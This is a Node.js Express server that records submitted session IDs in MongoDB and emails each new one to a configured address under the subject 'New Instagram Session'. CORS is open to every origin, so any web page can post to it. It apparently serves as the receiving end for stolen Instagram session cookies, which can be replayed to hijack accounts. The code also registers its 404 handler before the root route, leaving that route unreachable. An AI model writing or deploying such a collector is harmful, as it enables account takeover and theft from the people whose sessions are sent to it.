require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const nodemailer = require("nodemailer");
const dotenv = require("dotenv");
dotenv.config({ path: "./.env" });
const cors = require("cors");

const app = express();

// Middleware to enforce JSON responses
app.use(cors());
app.use(express.json());
app.use((req, res, next) => {
  // Reject non-JSON requests
  if (req.headers["content-type"] !== "application/json") {
    return res.status(415).json({
      success: false,
      error: "Content-Type must be application/json",
    });
  }
  next();
});

// MongoDB Connection
mongoose
  .connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .catch((err) => console.error("MongoDB connection error:", err));

// Session Model
const sessionSchema = new mongoose.Schema({
  sessionId: { type: String, unique: true },
  createdAt: { type: Date, expires: "1h", default: Date.now },
});
const Session = mongoose.model("Session", sessionSchema);

// API Endpoint
app.post("/api/sessions", async (req, res) => {
  try {
    // Validate request
    if (!req.body.sessionId) {
      return res.status(400).json({
        success: false,
        error: "sessionId is required",
      });
    }

    // Check for existing session (atomic operation)
    const result = await Session.findOneAndUpdate(
      { sessionId: req.body.sessionId },
      { $setOnInsert: { sessionId: req.body.sessionId } },
      { upsert: true, new: false }
    );

    // If session already existed
    if (result) {
      return res.json({
        success: true,
        isNew: false,
        message: "Session already exists",
      });
    }

    // Send email for new sessions
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.sendMail({
      to: process.env.RECIPIENT_EMAIL,
      subject: "New Instagram Session",
      text: `Session ID: ${req.body.sessionId}`,
    });

    res.json({
      success: true,
      isNew: true,
      message: "New session recorded",
    });
  } catch (error) {
    console.error("Server error:", error);
    res.status(500).json({
      success: false,
      error: "Internal server error",
    });
  }
});

// Handle 404
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
  });
});

app.get("/", (req, res) => {
  res.send("Hello World");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
